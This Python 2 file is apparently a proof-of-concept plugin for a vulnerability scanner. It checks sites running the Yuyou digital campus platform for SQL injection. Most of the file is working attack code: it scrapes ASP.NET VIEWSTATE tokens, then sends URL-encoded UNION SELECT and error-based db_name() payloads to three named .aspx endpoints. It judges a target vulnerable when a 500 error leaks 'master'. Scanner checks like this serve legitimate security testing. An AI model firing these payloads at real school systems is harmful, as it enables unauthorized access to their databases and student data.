# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
from urllib import quote

class Vuln(ABVuln):
    vuln_id = 'yuysoft_0003' # 平台漏洞编号，留空
    name = '育友通用数字化校园平台 SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-04-02'  # 漏洞公布时间
    desc = '''
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '育友通用数字化校园平台'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

def findVIEWSTATE(url):
    hh = hackhttp.hackhttp()
    m_values=[]
    code, head, res, errcode, _ = hh.http(url)
    m1=re.search("__VIEWSTATE.*?value=\"(.*?)\"",res,re.S)
    m2=re.search("__EVENTVALIDATION.*?value=\"(.*?)\"",res,re.S)
    if m1 and m2:
        m_values.append(m1.group(1))
        m_values.append(m2.group(1))
        return m_values
    else:
        return ['','']

class Poc(ABPoc):
    poc_id = 'c60cf706-360e-4980-b421-48b387115285'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #refer:http://www.wooyun.org/bugs/wooyun-2010-0105296
            #refer:http://www.wooyun.org/bugs/wooyun-2010-0105378
            #refer:http://www.wooyun.org/bugs/wooyun-2010-0105721
            hh = hackhttp.hackhttp()
            payloads = [
                '/Resource/search/search.aspx',
                '/Inedu3In1/components/xsjz.aspx',
            ]
            postdatas = {
                payloads[0]:'&Title=1%27%20union%20all%20select%20db_name%281%29%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--&username=&KeyWord=&sDate=&eDate=&btnsearch=&__EVENTVALIDATION=',
                payloads[1]:'&__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&classid=0&TB_Search=1%27%20and%20db_name%281%29%3E1--&IB_Search.x=4&IB_Search.y=13&__EVENTVALIDATION='
            }
            for payload in payloads:
                url = self.target + payload 
                viewstate_value = findVIEWSTATE(url)
                postdata = '__VIEWSTATE=' + quote(viewstate_value[0]) + postdatas[payload] + quote(viewstate_value[1])
                code, head, res, errcode, _ = hh.http(url, postdata)
                if code == 500 and 'master' in res :
                    #security_hole(arg+payload)
                    print(url)
                
            payload = '/Resource/search/SearchList.aspx?chk_Gra=1'
            getdata = ')%20and%20db_name%281%29%3E0--'
            url = self.target + payload + getdata
            code, head, res, errcode, _ = hh.http(url)
            if code == 500 and 'master' in res :
                #security_hole(arg+payload)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
